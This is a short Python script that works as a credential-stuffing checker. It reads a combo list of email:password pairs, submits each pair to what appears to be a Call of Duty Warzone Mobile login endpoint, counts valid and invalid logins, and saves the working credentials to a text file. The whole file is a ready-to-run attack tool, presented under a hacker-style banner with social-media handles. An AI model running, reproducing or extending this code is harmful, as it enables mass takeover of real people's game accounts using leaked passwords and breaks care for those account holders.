from requests import post
import os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ok=0
wp=0
logo=(f'''{G} _    _ _     _                     
{G}| |  | | |   (_)                    
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |              
{G}                   |_|              
{G}[G] GitHub    : {B}@VIPWhisper
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[F] FaceBook  : {B}@WHISPER.DZA
{G}[T] TeleGram  : {B}@WHI3PER''')
def msg(email,psw):
 global ok,wp
 os.system('clear')
 print(logo)
 print(f'{B}ـ'*40)
 print(f'''{G}[√] Hit : {B}{ok}
{S}[×] Wrong : {E}{wp}''')
 print(f'{B}ـ'*40)
 print(f'{S}[+] {B}{email} {S}| {B}{psw}')
 print(f'{B}ـ'*40)
def whisper(email,psw):
 global ok,wp
 response = post('https://wzm-and-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=atvimobile-cod-wzm-and', json={"version": 1538,"platform": "and","hardwareType": "and","auth": {"email":email,"password":psw}}).text
 if 'Error:ClientError:CountryBlockedError' in response or 'authenticate' in response or 'Error:DownStreamError:DownstreamBadReques' in response or 'loginTicket' in response:
  ok+=1
  msg(email,psw)
  with open('CallOfDuty.txt','a+') as whisper:
     whisper.write(f'{email}:{psw}\n')
 elif 'The provided credentials are invalid.' in response:
  wp+=1
  msg(email,psw)
os.system('clear')
print(logo)
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  email=acc.split(':')[0]
  psw=acc.split(':')[1].split(' ')[0]
  whisper(email,psw)